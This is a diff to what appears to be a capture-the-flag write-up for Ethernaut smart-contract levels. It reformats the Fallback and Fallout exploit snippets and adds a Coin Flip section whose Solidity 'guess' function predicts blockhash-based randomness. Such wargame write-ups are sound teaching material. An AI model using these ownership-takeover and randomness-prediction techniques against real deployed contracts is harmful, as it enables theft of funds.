@@ -48,17 +48,17 @@ This level requires 2 steps to complete as described:
 The trick here is to use the fallback `receive` function to get the ownership of the contract.
 
 ```sol
-  receive() external payable {
-    require(msg.value > 0 && contributions[msg.sender] > 0);
-    owner = msg.sender;
-  }
+receive() external payable {
+  require(msg.value > 0 && contributions[msg.sender] > 0);
+  owner = msg.sender;
+}
 ```
 In order to archieve this, we must statisfy 2 conditions: `msg.value` must be greater than zero and our account must have contributed.
 
 So before calling the fallback `receive` function, we need to make a contribution to the contract. We can do so as follows:
 
 ```js
-  await contract.contribute({ value: 1 });
+await contract.contribute({ value: 1 });
 ```
 You can also check that the contribution was successful by calling the following line
 
@@ -98,7 +98,6 @@ await contract.withdraw()
 In this contract there is a typo (not very visible due to the text font) in the 'constructor' function. Wich means that its name does not match with the contract name.
 
 ```sol
-
 contract Fallout {
 
   //...
@@ -127,3 +126,24 @@ And we are done!
 ---
 
 ### 4. Coin Flip
+On this level we are going to exploit the pseudo-randomness of smart contracts.
+
+```sol
+uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+```
+
+Turns out that the `blockValue` is totally deterministic on a given block, which means that we can replicate this value using another smart contract and calling the function `guess` from there.
+
+The code of the smart contract is [here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/CoinFlip.sol) where `victimAddress` is the address of the contract instance.
+
+As a summary, the following function will guess the coin side successfully in every single try:
+
+```sol
+function guess() public {
+  uint256 blockValue = uint256(blockhash(block.number - 1));
+  uint256 coinFlip = blockValue / FACTOR;
+  bool myGuess = coinFlip == 1 ? true : false;
+  CoinFlipInterface(victimAddress).flip(myGuess);
+}
+```
+Then you just have to call your `guess` function 10 times.
